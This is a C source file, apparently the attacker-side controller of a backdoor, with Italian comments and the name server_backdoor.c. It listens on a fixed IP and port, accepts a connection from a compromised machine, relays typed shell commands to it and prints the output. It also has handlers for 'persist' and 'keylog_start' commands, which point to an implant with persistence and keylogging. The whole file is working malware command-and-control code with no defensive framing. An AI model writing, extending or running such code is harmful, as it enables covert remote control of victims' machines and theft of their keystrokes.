// Compilation: gcc server_backdoor.c -o server_backdoor

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(){
    // Definisco tutte le variabili utilizzate.
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0x0);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0x0){
        printf("Error Setting TCP Socket Options!\n");
        return 0x1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.148.142");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    while(1){
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);                               // stdin -> Standard Input.
        strtok(buffer, "\n");                                               // Rimuove "\n" dalla stringa.
        write(client_socket, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 0x1) == 0x0){
            break;
        } else if(strncmp("cd ", buffer, 3) == 0x0){
            goto jump;
        } else if (strncmp("persist", buffer, 0x7) == 0x0) {
			recv(client_socket, response, sizeof(response), 0);             // Con flag MSG_WAITALL non funziona e rimane in attesa all'infinito del messaggio.
			printf("%s", response);
		} else if (strncmp("keylog_start", buffer, 12) == 0x0){
            goto jump;
        } else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);   // MSG_WAITALL -> Blocca le operazioni fino a quando l'intera richiesta e`soddisfatta. 
            printf("%s", response);
        }
        
    }


}
